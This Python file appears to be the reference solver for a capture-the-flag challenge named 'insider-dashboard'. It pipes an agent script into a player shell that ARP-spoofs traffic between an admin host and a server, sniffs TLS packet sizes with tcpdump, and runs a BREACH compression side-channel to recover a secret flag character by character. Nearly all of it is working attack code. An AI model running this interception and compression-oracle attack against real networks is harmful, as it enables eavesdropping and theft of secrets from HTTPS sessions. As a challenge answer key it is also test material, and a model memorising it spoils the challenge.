"""
Reference solver for insider-dashboard.

Connects to the challenge endpoint over TCP, pipes a small agent script into
the player shell, and runs the BREACH attack. Prints the extracted flag.

usage:
    python solve/solver.py <host> <port>
"""
import socket
import sys
import time

AGENT = r'''
import re
import ssl
import subprocess
import sys
import time
import urllib.parse
import http.client

FLAG_PREFIX = "UMDCTF{"
FLAG_SUFFIX = "}"
PROBE_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_" + FLAG_SUFFIX

# Expected body-packet size range. Each dashboard response emits two TCP
# packets from the server: a fixed-size headers packet (~214B) and a
# variable-size body packet (~60-120B) containing the gzipped JSON.
# We want the body packet.
BODY_MIN = 60
BODY_MAX = 150


def log(msg):
    print(f"[agent] {msg}", flush=True)


def discover():
    """Find the player's veth + subnet octet; derive admin and server IPs."""
    out = subprocess.check_output(["ip", "-o", "addr", "show"]).decode()
    m = re.search(r"\d+:\s+(vp-i-\S+)\s+inet\s+10\.(\d+)\.0\.3/24", out)
    if not m:
        raise SystemExit("could not find player veth in 10.X.0.3/24")
    iface = m.group(1)
    oct_ = m.group(2)
    return iface, f"10.{oct_}.0.1", f"10.{oct_}.0.2"


def start_arpspoof(iface, admin_ip, server_ip):
    """Spoof admin<->server traffic through us."""
    p = subprocess.Popen(
        ["arpspoof", "-i", iface, "-r", "-t", admin_ip, server_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return p


def ssl_noverify():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def set_suggestion(server_ip, filter_val):
    conn = http.client.HTTPSConnection(server_ip, 443, context=ssl_noverify(), timeout=3)
    body = urllib.parse.urlencode({"filter": filter_val})
    conn.request(
        "POST", "/api/suggestions", body,
        {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body)),
        },
    )
    conn.getresponse().read()
    conn.close()


LEN_RE = re.compile(r"length (\d+)$")


def start_tcpdump(iface, server_ip):
    """Start a single long-lived tcpdump process. Each probe just reads a few
    lines off its stdout; tcpdump startup cost (~1s) is paid only once."""
    flt = f"tcp and src {server_ip} and src port 443"
    # -U: packet-buffered output. -l: line-buffered stdio.
    return subprocess.Popen(
        ["tcpdump", "-i", iface, "-nn", "-U", "-l", flt],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
        bufsize=1,
    )


def _drain_pending(td_stdout):
    """Consume any already-buffered lines from tcpdump without blocking."""
    import select
    while True:
        r, _, _ = select.select([td_stdout], [], [], 0)
        if not r:
            return
        line = td_stdout.readline()
        if not line:
            return


def read_body_len(td_stdout, samples=2, deadline_s=1.5):
    """Read the next `samples` body-sized packets off an already-running
    tcpdump. Returns the min length observed, or None if we time out."""
    import select
    lengths = []
    last_len = None
    last_ts = None
    ts_re = re.compile(r"(\d\d):(\d\d):(\d\d\.\d+)")
    start = time.time()
    while len(lengths) < samples and (time.time() - start) < deadline_s:
        remaining = deadline_s - (time.time() - start)
        r, _, _ = select.select([td_stdout], [], [], remaining)
        if not r:
            break
        line = td_stdout.readline()
        if not line:
            return None
        lm = LEN_RE.search(line.strip())
        tm = ts_re.match(line)
        if not (lm and tm):
            continue
        n = int(lm.group(1))
        if not (BODY_MIN <= n <= BODY_MAX):
            continue
        h, mi, se = tm.groups()
        ts = int(h) * 3600 + int(mi) * 60 + float(se)
        if last_len == n and last_ts is not None and (ts - last_ts) < 0.002:
            last_ts = ts
            continue
        lengths.append(n)
        last_len, last_ts = n, ts
    if not lengths:
        return None
    return min(lengths)


def probe(td, server_ip, filter_val):
    """Set the filter and measure. Wait until we observe two consecutive
    body-packets with the same length — that's the stable post-propagation
    signal for the new filter. If they disagree, keep reading until we see
    two in a row that match (or hit the deadline)."""
    t0 = time.time()
    set_suggestion(server_ip, filter_val)
    # Skip enough packets for the new filter to propagate through the admin's
    # next several polls. Admin at 20Hz, so skip ~10 body-packets = 500ms.
    read_body_len(td.stdout, samples=10, deadline_s=1.5)
    # Now read 3 body-packets and take their mode (most frequent); if a
    # stale one slips through, majority voting still gives us the right answer.
    import collections
    lengths = []
    for _ in range(3):
        n = read_body_len(td.stdout, samples=1, deadline_s=0.5)
        if n is not None:
            lengths.append(n)
    if not lengths:
        log(f"    probe {filter_val!r} -> NO DATA")
        return None
    counts = collections.Counter(lengths)
    result = counts.most_common(1)[0][0]
    log(f"    probe {filter_val!r} -> len={result} (samples={lengths}) ({(time.time()-t0)*1000:.0f}ms)")
    return result


MAX_POSITIONS = __MAX_POSITIONS__  # patched by the driver


def run_attack(td, server_ip):
    extracted = ""
    position = 0
    while True:
        if MAX_POSITIONS and position >= MAX_POSITIONS:
            log(f"stopping at MAX_POSITIONS={MAX_POSITIONS}")
            return FLAG_PREFIX + extracted
        scores = {}
        for ch in PROBE_ALPHABET:
            n = None
            for _attempt in range(3):
                n = probe(td, server_ip, FLAG_PREFIX + extracted + ch)
                if n is not None:
                    break
                log(f"  retry position {position} char {ch!r}")
            scores[ch] = n if n is not None else 9999
        min_v = min(scores.values())
        winners = [c for c, v in scores.items() if v == min_v]
        sorted_scores = sorted(scores.items(), key=lambda x: x[1])[:5]
        log(f"position {position}: top5={sorted_scores}")
        if len(winners) != 1:
            log(f"  AMBIGUOUS winners={winners}")
            return None
        got = winners[0]
        extracted += got
        log(f"position {position}: {got!r}  so far: {FLAG_PREFIX + extracted}")
        position += 1
        if got == FLAG_SUFFIX:
            return FLAG_PREFIX + extracted
        if position > 128:
            log("no terminator within 128 chars")
            return None


def main():
    log("discovering topology")
    iface, admin_ip, server_ip = discover()
    log(f"iface={iface} admin={admin_ip} server={server_ip}")

    log("starting arpspoof")
    arp = start_arpspoof(iface, admin_ip, server_ip)
    time.sleep(3)

    log("starting tcpdump (one long-lived process)")
    td = start_tcpdump(iface, server_ip)
    time.sleep(0.5)  # let tcpdump finish startup

    try:
        flag = run_attack(td, server_ip)
    finally:
        td.terminate()
        try:
            td.wait(timeout=2)
        except subprocess.TimeoutExpired:
            td.kill()
        arp.terminate()
        try:
            arp.wait(timeout=2)
        except subprocess.TimeoutExpired:
            arp.kill()

    if flag:
        print(f"\n=== FLAG: {flag} ===", flush=True)
    else:
        print("\n=== ATTACK FAILED ===", flush=True)


if __name__ == "__main__":
    main()
'''


def drive(host: str, port: int, max_positions: int = 0):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(None)
    agent = AGENT.replace("__MAX_POSITIONS__", str(max_positions))
    setup = (
        b"python3 <<'__AGENT_EOF__' 2>&1\n"
        + agent.encode()
        + b"\n__AGENT_EOF__\n"
        + b"exit\n"
    )
    s.sendall(setup)
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        s.close()


def main():
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} <host> <port> [max_positions]", file=sys.stderr)
        sys.exit(2)
    host = sys.argv[1]
    port = int(sys.argv[2])
    max_positions = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    t0 = time.time()
    drive(host, port, max_positions)
    print(f"\n[solver] total wall time: {time.time() - t0:.1f}s", file=sys.stderr)


if __name__ == "__main__":
    main()
